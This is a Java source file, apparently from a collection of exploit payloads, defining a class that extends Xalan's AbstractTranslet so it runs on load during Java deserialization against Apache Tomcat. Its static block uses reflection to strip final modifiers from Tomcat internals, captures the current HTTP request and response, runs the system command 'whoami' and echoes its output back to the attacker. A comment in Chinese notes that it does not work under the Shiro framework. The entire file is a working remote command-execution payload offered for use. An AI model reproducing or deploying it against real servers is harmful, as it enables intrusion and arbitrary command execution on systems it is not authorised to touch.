package com.Jasetol.payloads;

import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;

/*
 * Shiro 框架无法注入
 * */
public class echoForTomcat03 extends AbstractTranslet {

    static {
        try{
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            wrap_same_object.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            lastServicedRequest.setAccessible(true);
            Field modifiers = Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(wrap_same_object,wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiers.setInt(lastServicedRequest,lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiers.setInt(lastServicedResponse,lastServicedResponse.getModifiers() & ~Modifier.FINAL);
            Boolean wrap = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> lastRequest = (ThreadLocal<ServletRequest>) lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> lastResponse = (ThreadLocal<ServletResponse>) lastServicedResponse.get(null);
            wrap_same_object.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal());
            lastServicedResponse.set(null,new ThreadLocal());
            ServletResponse response = (ServletResponse) lastResponse.get();
            ServletRequest request = (ServletRequest) lastRequest.get();
            Process process = Runtime.getRuntime().exec("whoami");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuffer stringBuffer = new StringBuffer();
            String lineData;
            while ((lineData = bufferedReader.readLine()) != null){
                stringBuffer.append(lineData + '\n');
            }

            response.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
            response.getOutputStream().flush();
            response.getOutputStream().close();
        }catch (Exception e){}
    }


    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}